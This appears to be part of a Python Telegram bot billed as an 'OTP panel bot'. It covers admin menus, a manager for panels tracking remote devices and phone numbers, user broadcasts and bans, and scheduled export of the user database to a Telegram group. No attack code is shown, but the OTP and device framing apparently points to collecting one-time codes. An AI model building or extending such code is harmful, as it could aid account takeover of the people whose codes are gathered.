            premium_button("60s", callback_data="adm_autodb_int:60", style="primary"),
            premium_button("120s", callback_data="adm_autodb_int:120", style="primary"),
        ], [
            premium_button("300s", callback_data="adm_autodb_int:300", style="primary"),
            premium_button("600s", callback_data="adm_autodb_int:600", style="primary"),
        ], [
            premium_button("⬅️ Back", callback_data="adm_autodb", style="primary"),
        ]]
        await safe_edit(
            query,
            f"⏱ <b>INTERVAL</b>\n━━━━━━━━━━━━━━━━━━\n"
            f"Current: <b>{AUTO_DB_INTERVAL}s</b>\n\nNaya interval choose karein:",
            reply_markup=InlineKeyboardMarkup(rows),
        )
        return True

    if data.startswith("adm_autodb_int:"):
        AUTO_DB_INTERVAL = int(data.split(":", 1)[1])
        save_data()
        await query.answer(f"⏱ {AUTO_DB_INTERVAL}s")
        await safe_edit(query, adm_autodb_text(), reply_markup=adm_autodb_keyboard())
        return True

    if data == "adm_autodb_now":
        if not AUTO_DB_GROUP:
            await query.answer("⚠️ Pehle group set karein!", show_alert=True)
            return True
        await query.answer("📤 Sending…")
        try:
            data_bytes = _db_snapshot_bytes()
            fname = f"database_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            await ctx.bot.send_document(
                chat_id=AUTO_DB_GROUP,
                document=data_bytes,
                filename=fname,
                caption=(
                    "🗄 <b>MANUAL DATABASE</b>\n"
                    "━━━━━━━━━━━━━━━━━━\n"
                    f"📡 Panels: <b>{len(DATABASES)}</b>\n"
                    f"👥 Users: <b>{len(all_users)}</b>\n"
                    f"🕒 {datetime.now().strftime('%d %b %Y %I:%M %p')}"
                ),
                parse_mode="HTML",
            )
            if AUTO_DB_BACKUP_GROUP and AUTO_DB_BACKUP_GROUP != AUTO_DB_GROUP:
                try:
                    await ctx.bot.send_document(
                        chat_id=AUTO_DB_BACKUP_GROUP,
                        document=_db_snapshot_bytes(),
                        filename=fname,
                        caption=(
                            "🗄 <b>BACKUP DATABASE (manual)</b>\n"
                            f"🔁 Copy of: <code>{AUTO_DB_GROUP}</code>"
                        ),
                        parse_mode="HTML",
                    )
                except Exception as be:
                    _log(f"Manual backup DB error: {type(be).__name__}: {be}")
            AUTO_DB_SENT_COUNT += 1
            AUTO_DB_LAST_SENT = time.time()
            await query.message.reply_text(
                "✅ Database group me bhej diya."
                + (" Backup channel me bhi copy gayi." if AUTO_DB_BACKUP_GROUP else "")
            )
        except Exception as e:
            await query.message.reply_text(f"❌ Send failed: <code>{html_escape(str(e))}</code>",
                                           parse_mode="HTML")
        return True

    # ══════════ ADMIN: PANEL MANAGER ══════════
    if data == "adm_panel_mgr":
        await query.answer()
        await safe_edit(query, adm_panel_mgr_text(0), reply_markup=adm_panel_mgr_keyboard(0))
        return True

    if data.startswith("adm_pmgr:"):
        page = int(data.split(":", 1)[1])
        await query.answer()
        await safe_edit(query, adm_panel_mgr_text(page), reply_markup=adm_panel_mgr_keyboard(page))
        return True

    if data.startswith("adm_pinfo:"):
        safe_tag = data.split(":", 1)[1]
        tag = find_tag_by_safe(safe_tag)
        if not tag:
            await query.answer("❌ Panel not found", show_alert=True)
            return True
        devs = GLOBAL_DEVICE_CACHE.get(tag, [])
        on = sum(1 for d in devs if d.status == "online")
        nums = sum(len(d.numbers) for d in devs if d.numbers)
        lock = "🔒 Admin-Only" if tag in ADMIN_ONLY_TAGS else "🔓 Public"
        rows = [
            [premium_button("🔒/🔓 Toggle Lock", callback_data=f"toggleadmin:{safe_tag}", style="primary")],
            [premium_button("🗑 Delete Panel", callback_data=f"adm_pdel:{safe_tag}", style="danger")],
            [premium_button("⬅️ Back", callback_data="adm_panel_mgr", style="primary")],
        ]
        await query.answer()
        await safe_edit(
            query,
            f"{premium_emoji()} <b>PANEL INFO</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            f"🏷 Tag     : <b>{html_escape(tag)}</b>\n"
            f"🔗 URL     : <code>{html_escape(str(DATABASES.get(tag, ''))[:60])}</code>\n"
            f"📱 Devices : <b>{len(devs)}</b>\n"
            f"🟢 Online  : <b>{on}</b>\n"
            f"🔢 Numbers : <b>{nums}</b>\n"
            f"🔐 Access  : <b>{lock}</b>",
            reply_markup=InlineKeyboardMarkup(rows),
        )
        return True

    if data.startswith("adm_pdel:"):
        safe_tag = data.split(":", 1)[1]
        tag = find_tag_by_safe(safe_tag)
        if not tag:
            await query.answer("❌ Panel not found", show_alert=True)
            return True
        DATABASES.pop(tag, None)
        ADMIN_ONLY_TAGS.discard(tag)
        save_data()
        await query.answer(f"🗑 Deleted {tag}", show_alert=True)
        await safe_edit(query, adm_panel_mgr_text(0), reply_markup=adm_panel_mgr_keyboard(0))
        return True

    # ══════════ ADMIN: STATS / SYSTEM ══════════
    if data == "adm_stats":
        await query.answer()
        await safe_edit(query, adm_stats_text(), reply_markup=admin_keyboard())
        return True

    if data == "adm_sysinfo":
        await query.answer()
        await safe_edit(query, adm_sysinfo_text(), reply_markup=admin_keyboard())
        return True

    if data == "adm_logs":
        await query.answer()
        tail = RECENT_LOGS[-25:] or ["(no logs yet)"]
        await safe_edit(
            query,
            f"{premium_emoji()} <b>RECENT LOGS</b>\n━━━━━━━━━━━━━━━━━━\n"
            "<pre>" + html_escape("\n".join(tail)) + "</pre>",
            reply_markup=admin_keyboard(),
        )
        return True

    if data == "adm_maintenance":
        MAINTENANCE_MODE = not MAINTENANCE_MODE
        save_data()
        await query.answer("🛠 Maintenance ON" if MAINTENANCE_MODE else "✅ Maintenance OFF")
        await safe_edit(query, adm_stats_text(), reply_markup=admin_keyboard())
        return True

    if data == "adm_backup":
        await query.answer("💾 Preparing…")
        try:
            await ctx.bot.send_document(
                chat_id=chat_id,
                document=_db_snapshot_bytes(),
                filename=f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json",
                caption="💾 <b>Full Backup</b>\nPanels: %d | Users: %d" % (len(DATABASES), len(all_users)),
                parse_mode="HTML",
            )
        except Exception as e:
            await query.message.reply_text(f"❌ {html_escape(str(e))}", parse_mode="HTML")
        return True

    if data == "adm_export":
        await query.answer("📑 Exporting…")
        try:
            await ctx.bot.send_document(
                chat_id=chat_id,
                document=_users_csv_bytes(),
                filename=f"users_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv",
                caption=f"📑 <b>Users CSV</b> — {len(all_users)} users",
                parse_mode="HTML",
            )
        except Exception as e:
            await query.message.reply_text(f"❌ {html_escape(str(e))}", parse_mode="HTML")
        return True

    return False


# ─────────────────────────── TEXT INPUT HANDLER ───────────────────────────

class _BroadcastCaptureFilter(filters.UpdateFilter):
    """PTB filter wrapper: matches only while an admin composes a broadcast.

    ⚠️ IMPORTANT: filters.BaseFilter directly subclass KARNA bug tha —
    BaseFilter.check_update() kabhi self.filter() call hi nahi karta, isliye
    ye filter HAR message par True hota tha aur broadcast handler group -1 me
    har admin message ka pending_action kha jata tha (Grant Access / Force
    Join Add sab toot jate the). UpdateFilter subclass karne se check_update
    sahi tarah self.filter(update) call karta hai."""

    def filter(self, update) -> bool:
        return _is_broadcast_capture(update)


def _is_broadcast_capture(update) -> bool:
    """Filter: only true while an admin is composing a broadcast."""
    try:
        chat = update.effective_chat
        if chat is None:
            return False
        return chat.id in ADMIN_IDS and pending_action.get(chat.id, {}).get("action") == "broadcast_msg"
    except Exception:
        return False


async def _run_broadcast(ctx, chat_id: int, msg_id: int, reply_markup=None,
                         status_msg=None) -> None:
    """Send an EXACT copy of the admin's message to every user."""
    targets = [int(uid) for uid in list(all_users.keys()) if int(uid) != chat_id]
    if status_msg is None:
        status_msg = await ctx.bot.send_message(
            chat_id,
            f"{premium_emoji()} <b>BROADCAST STARTED</b>\n"
            "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n"
            f"Recipients : <b>{len(targets)}</b>\n"
            f"Buttons    : <b>{'Yes' if reply_markup else 'No'}</b>\n"
            "<i>Sending exact copy...</i>",
            parse_mode="HTML",
        )
    sent = blocked = failed = 0
    for uid in targets:
        try:
            await ctx.bot.copy_message(
                chat_id=uid,
                from_chat_id=chat_id,
                message_id=msg_id,
                reply_markup=reply_markup,
            )
            sent += 1
        except Forbidden:
            blocked += 1
        except Exception as exc:
            failed += 1
            _log(f"broadcast fail {uid}: {type(exc).__name__}: {exc}")
        await asyncio.sleep(0.05)

    report = (
        f"{premium_emoji()} <b>BROADCAST COMPLETE</b>\n"
        "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n"
        f"\u2705 Sent    : <b>{sent}</b>\n"
        f"\u26d4 Blocked : <b>{blocked}</b>\n"
        f"\u26a0\ufe0f Failed  : <b>{failed}</b>\n"
        "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n"
        "<i>Premium emoji, rich formatting aur inline buttons as-is copy hue.</i>"
    )
    try:
        await status_msg.edit_text(report, parse_mode="HTML")
    except Exception:
        try:
            await ctx.bot.send_message(chat_id, report, parse_mode="HTML")
        except Exception:
            pass


def _parse_broadcast_buttons(raw: str):
    """Parse admin button spec into an InlineKeyboardMarkup.

    Formats (one per line):
        Label | https://example.com
        Label | cb:callback_data
        Label | url:https://example.com
    """
    def _mk(spec: str):
        if "|" not in spec:
            return None
        label, target = spec.split("|", 1)
        label, target = label.strip(), target.strip()
        if not label or not target:
            return None
        if target.lower().startswith("cb:"):
            return premium_button(label, callback_data=target[3:].strip()[:60])
        url = target[4:].strip() if target.lower().startswith("url:") else target
        return premium_button(label, url=url)

    rows = []
    for line in (raw or "").splitlines():
        line = line.strip()
        if not line:
            continue
        row = []
        for spec in line.split("||"):
            btn = _mk(spec)
            if btn is not None:
                row.append(btn)
        if row:
            rows.append(row)
    return InlineKeyboardMarkup(rows) if rows else None


async def on_broadcast_capture(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    """EXACT COPY broadcast: admin ka message jaise ka waisa (inline buttons,
    premium emoji, rich formatting sab as-is) sabhi users ko copy hota hai.
    Koi button-label step nahi — copy_message original reply_markup bhi
    preserve karta hai."""
    chat_id = update.effective_chat.id
    if chat_id not in ADMIN_IDS:
        return
    # Defense in depth: sirf broadcast pending ho tabhi pop karo — kisi aur
    # pending action (grant access, force join add, search) ko kabhi na chhede.
    act = pending_action.get(chat_id)
    if not act or act.get("action") != "broadcast_msg":
        return
    pending_action.pop(chat_id, None)

    src = update.effective_message
    if src is None:
        return

    # reply_markup=None => PTB param omit karta hai => Telegram copy me
    # original inline keyboard + premium emoji + formatting as-is rehti hai.
    await _run_broadcast(ctx, chat_id, src.message_id, reply_markup=None)


async def extra_text_actions(update, ctx, action: str, act_data: dict, text: str,
                             chat_id: int, is_admin: bool) -> bool:
    global AUTO_DB_GROUP, AUTO_DB_ENABLED

    if not is_admin:
        return False

    if action == "adm_ban_user":
        target = None
        if update.message.reply_to_message:
            target = update.message.reply_to_message.from_user.id
        else:
            try:
                target = int(text.strip().lstrip("@"))
            except ValueError:
                target = None
        if not target:
            await update.message.reply_text("❌ Valid user ID bhejein.")
            return True
        if target in ADMIN_IDS:
            await update.message.reply_text("⚠️ Admin ko ban nahi kar sakte.")
            return True
        all_users.setdefault(target, {"name": "Unknown", "joined_at": "-"})["banned"] = True
        save_data()
        await update.message.reply_text(
            f"🚫 <b>User Banned</b>\n<code>{target}</code>",
            parse_mode="HTML",
        )
        return True

    if action == "adm_unban_user":
        try:
            target = int(text.strip().lstrip("@"))
        except ValueError:
            await update.message.reply_text("❌ Valid user ID bhejein.")
            return True
        if target not in all_users:
            await update.message.reply_text("❌ User not found.")
            return True
        all_users[target]["banned"] = False
        save_data()
        await update.message.reply_text(
            f"✅ <b>User Unbanned</b>\n<code>{target}</code>",
            parse_mode="HTML",
        )
        return True

    if action == "adm_search_user":
        q = text.strip().lower()
        hits = []
        for uid, u in all_users.items():
            if q in str(uid) or q in (u.get("name") or "").lower() or q in (u.get("username") or "").lower():
                hits.append((uid, u))
        if not hits:
            await update.message.reply_text("❌ Koi user nahi mila.")
            return True
        lines = [f"🔎 <b>SEARCH RESULTS ({len(hits)})</b>", "━━━━━━━━━━━━━━━━━━"]
        for uid, u in hits[:20]:
            ban = "🚫" if u.get("banned") else "✅"
            lines.append(f"{ban} {html_escape(u.get('name', 'Unknown'))} (@{u.get('username') or '-'}) — <code>{uid}</code>")
        await update.message.reply_text("\n".join(lines), parse_mode="HTML")
        return True

    if action == "adm_userinfo":
        try:
            target = int(text.strip().lstrip("@"))
        except ValueError:
            await update.message.reply_text("❌ Valid user ID bhejein.")
            return True
        u = all_users.get(target)
        if not u:
            await update.message.reply_text("❌ User not found.")
            return True
        await update.message.reply_text(
            f"🪪 <b>USER INFO</b>\n━━━━━━━━━━━━━━━━━━\n"
            f"🆔 ID       : <code>{target}</code>\n"
            f"👤 Name     : <b>{html_escape(u.get('name', 'Unknown'))}</b>\n"
            f"🔗 Username : @{html_escape(u.get('username') or 'none')}\n"
            f"📅 Joined   : <b>{u.get('joined_at', '-')}</b>\n"
            f"🚫 Banned   : <b>{'Yes' if u.get('banned') else 'No'}</b>\n"
            f"✅ Access   : <b>{'Yes' if has_access(target) else 'No'}</b>\n"
            f"🎁 Referrals: <b>{len(u.get('referrals', []) or [])}</b>",
            parse_mode="HTML",
        )
        return True

    if action == "adm_dm":
        if "|" not in text:
            await update.message.reply_text("❌ Format: USER_ID | message")
            return True
        raw_id, msg = text.split("|", 1)
        try:
            target = int(raw_id.strip())
        except ValueError:
            await update.message.reply_text("❌ Invalid user ID.")
            return True
        try:
            await ctx.bot.send_message(
                target,
                f"📩 <b>Message from Admin</b>\n━━━━━━━━━━━━━━━━━━\n{html_escape(msg.strip())}",
                parse_mode="HTML",
            )
            await update.message.reply_text(f"✅ Message sent to <code>{target}</code>", parse_mode="HTML")
        except Exception as e:
            await update.message.reply_text(f"❌ Failed: {html_escape(str(e))}", parse_mode="HTML")
        return True

    if action == "adm_autodb_backup_set":
        global AUTO_DB_BACKUP_GROUP
        raw = text.strip()
        if raw.lower() in ("off", "none", "-", "remove", "0"):
            AUTO_DB_BACKUP_GROUP = 0
            save_data()
            await update.message.reply_text(
                "🗄 Backup channel hata diya.", reply_markup=adm_autodb_keyboard()
            )
            return True
        target = None
        origin = getattr(update.message, "forward_origin", None)
        fwd_chat = getattr(origin, "chat", None) or getattr(origin, "sender_chat", None)
        if fwd_chat is not None:
            target = fwd_chat.id
        elif raw.startswith("@"):
            try:
                chat = await ctx.bot.get_chat(raw)
                target = chat.id
            except Exception as e:
                await update.message.reply_text(
                    f"❌ @username resolve nahi hua: <code>{html_escape(str(e))}</code>\n"
                    "Bot ko us channel me admin banayein, ya numeric ID bhejein.",
                    parse_mode="HTML",
                )
                return True
        else:
            try:
                target = int(raw)
            except ValueError:
                target = None
        if not target:
            await update.message.reply_text(
                "❌ Valid channel ID / @username / forward bhejein (ya <code>off</code>).",
                parse_mode="HTML",
            )
            return True
        AUTO_DB_BACKUP_GROUP = target
        save_data()
        await update.message.reply_text(
            f"✅ <b>Backup Channel Set</b>\n<code>{target}</code>",
            parse_mode="HTML",
            reply_markup=adm_autodb_keyboard(),
        )
        return True

    if action == "adm_autodb_set":
        target = None
        # PTB v20+ replaced forward_from_chat with forward_origin.
        origin = getattr(update.message, "forward_origin", None)
        fwd_chat = getattr(origin, "chat", None) or getattr(origin, "sender_chat", None)
        if fwd_chat is not None:
            target = fwd_chat.id
        else:
            raw = text.strip()
            if raw.startswith("@") or re.fullmatch(r"[A-Za-z][A-Za-z0-9_]{3,}", raw):
                handle = raw if raw.startswith("@") else "@" + raw
                try:
                    chat = await ctx.bot.get_chat(handle)
                    target = chat.id
                except Exception as e:
                    await update.message.reply_text(
                        f"❌ <code>{html_escape(handle)}</code> resolve nahi hua: "
                        f"<code>{html_escape(str(e))}</code>\n\n"
                        "Bot ko us group me <b>admin</b> banayein, phir dobara try karein.\n"
                        "Ya numeric ID bhejein (e.g. <code>-1001234567890</code>).",
                        parse_mode="HTML")
                    return True
            else:
                try:
                    target = int(raw)
                except ValueError:
                    target = None
        if not target:
            await update.message.reply_text("❌ Valid group ID / @username / forward bhejein.")
            return True
        AUTO_DB_GROUP = target
        save_data()
        await update.message.reply_text(
            f"🎯 <b>Target Group Set</b>\n<code>{target}</code>\n\n"
            f"Ab Auto DB Sender ON karein (har {AUTO_DB_INTERVAL}s).",
            parse_mode="HTML",
            reply_markup=adm_autodb_keyboard(),
        )
        return True

    return False


async def cmd_cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    """Cancel any pending input action."""
    chat_id = update.effective_chat.id
    had = pending_action.pop(chat_id, None)
    pending_kw_confirm.pop(chat_id, None)
    if had:
        await update.message.reply_text(
            f"{premium_emoji()} <b>Cancelled</b>\n\nAction <code>{html_escape(str(had.get('action', '')))}</code> cancel ho gaya.",
            parse_mode="HTML",
        )
    else:
        await update.message.reply_text(
            f"{premium_emoji()} <b>Kuch pending nahi tha.</b>", parse_mode="HTML"
        )


async def cmd_setgroup(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    """Admin: /setgroup <chat_id|@username>  — set auto-DB target group."""
    global AUTO_DB_GROUP
    chat_id = update.effective_chat.id
    if chat_id not in ADMIN_IDS:
        await update.message.reply_text("🚫 Admin only.")
        return
    if not ctx.args:
        await update.message.reply_text(
            f"Usage: <code>/setgroup -1001234567890</code>\n"
            f"Current: <code>{AUTO_DB_GROUP or 'Not set'}</code>",
            parse_mode="HTML"
        )
        return
    raw = ctx.args[0].strip()
    try:
        target = int(raw)
    except ValueError:
        try:
            chat = await ctx.bot.get_chat(raw)
            target = chat.id
        except Exception as e:
            await update.message.reply_text(f"❌ {html_escape(str(e))}", parse_mode="HTML")
            return
    AUTO_DB_GROUP = target
    save_data()
    await update.message.reply_text(
        f"🎯 Target group set: <code>{target}</code>\n"
        f"Auto DB: {'ON' if AUTO_DB_ENABLED else 'OFF'} · Interval: {AUTO_DB_INTERVAL}s\n"
        f"ON karne ke liye: /autodb on",
        parse_mode="HTML"
    )


async def cmd_autodb(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    """Admin: /autodb [on|off|now|interval <sec>]"""
    global AUTO_DB_ENABLED, AUTO_DB_INTERVAL, AUTO_DB_LAST_SENT, AUTO_DB_SENT_COUNT
    chat_id = update.effective_chat.id
    if chat_id not in ADMIN_IDS:
        await update.message.reply_text("🚫 Admin only.")
        return
    arg = (ctx.args[0].lower() if ctx.args else "").strip()

    if arg == "on":
        if not AUTO_DB_GROUP:
            await update.message.reply_text("⚠️ Pehle /setgroup se group set karein.")
            return
        AUTO_DB_ENABLED = True
        save_data()
        await update.message.reply_text(f"🟢 Auto DB ON — every {AUTO_DB_INTERVAL}s → {AUTO_DB_GROUP}")
        return
    if arg == "off":
        AUTO_DB_ENABLED = False
        save_data()
        await update.message.reply_text("🔴 Auto DB OFF")
        return
    if arg == "now":
        if not AUTO_DB_GROUP:
            await update.message.reply_text("⚠️ Pehle /setgroup se group set karein.")
            return
        try:
            await ctx.bot.send_document(
                chat_id=AUTO_DB_GROUP,
                document=_db_snapshot_bytes(),
                filename=f"database_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json",
                caption="🗄 <b>MANUAL DATABASE</b>",
                parse_mode="HTML",
            )
            AUTO_DB_LAST_SENT = time.time()
            AUTO_DB_SENT_COUNT += 1
            await update.message.reply_text("✅ Sent.")
        except Exception as e:
            await update.message.reply_text(f"❌ {html_escape(str(e))}", parse_mode="HTML")
        return
    if arg == "interval" and len(ctx.args) > 1:
        try:
            AUTO_DB_INTERVAL = max(10, int(ctx.args[1]))
        except ValueError:
            await update.message.reply_text("❌ Invalid number.")
            return
        save_data()
        await update.message.reply_text(f"⏱ Interval = {AUTO_DB_INTERVAL}s")
        return

    await update.message.reply_text(adm_autodb_text(), reply_markup=adm_autodb_keyboard(),
                                    parse_mode="HTML")


async def on_error(update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    """Global error handler — har error log karo aur user ko batao.
    Isse koi bhi button/input kabhi 'chup-chaap' fail nahi hoga."""
    import traceback as _tb
    err = ctx.error
    if isinstance(err, Conflict) or "terminated by other getUpdates" in str(err):
        tlog("⛔ CONFLICT: Bot ka koi AUR instance bhi chal raha hai! "
             "Ek hi instance chalao — warna button-click aur text-reply alag-alag "
             "instances par chale jaate hain aur pending inputs 'Unknown command' ho jaate hain.")
        return
    _log(f"GLOBAL ERROR: {type(err).__name__}: {err}")
    _tb.print_exception(type(err), err, err.__traceback__)
    try:
        if isinstance(update, Update) and update.effective_chat is not None:
            await ctx.bot.send_message(
                update.effective_chat.id,
                f"⚠️ <b>Error</b>\n<code>{html_escape(str(err))[:300]}</code>\n\n"
                f"Dobara try karein — /start",
                parse_mode="HTML",
            )
    except Exception:
        pass


def main() -> None:
    print("═" * 56)
    print("  🤖 OTP PANEL BOT — ACCESS CONTROLLED EDITION")
    print("═" * 56)

    load_data()

    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("cancel", cmd_cancel))
    app.add_handler(CommandHandler("setgroup", cmd_setgroup))
    app.add_handler(CommandHandler("autodb", cmd_autodb))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("grant", cmd_grant))
    app.add_handler(CommandHandler("revoke", cmd_revoke))
    app.add_handler(CommandHandler("setadminpanel", cmd_setadminpanel))
    app.add_handler(CommandHandler("unsetadminpanel", cmd_unsetadminpanel))
    app.add_handler(CommandHandler("adminpanels", cmd_adminpanels))
    app.add_handler(CallbackQueryHandler(on_callback))
    app.add_handler(
        MessageHandler(filters.ALL & _BroadcastCaptureFilter(), on_broadcast_capture),
        group=-1,
    )
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    app.add_error_handler(on_error)
    app.add_handler(MessageHandler(filters.Document.ALL, on_document))

    async def post_init(application: Application):
        asyncio.create_task(poll_loop(application))
        asyncio.create_task(auto_save_loop())
        asyncio.create_task(auto_db_sender_loop(application))

    app.post_init = post_init

    print(f"  Token: ...{TOKEN[-10:]}")
    print(f"  Allowed Users: {len(allowed_users)}")
    print(f"  DBs Loaded: {len(DATABASES)}")
    print("═" * 56)

    webhook_url = os.environ.get("WEBHOOK_URL", "").strip()
    if webhook_url:
        port = int(os.environ.get("PORT", "8080"))
        print(f"  Webhook mode: {webhook_url}")
        app.run_webhook(
            listen="0.0.0.0",
            port=port,
            url_path="webhook",
            webhook_url=f"{webhook_url.rstrip('/')}/webhook",
            drop_pending_updates=True,
            allowed_updates=["message", "callback_query"],
        )
    else:
        app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()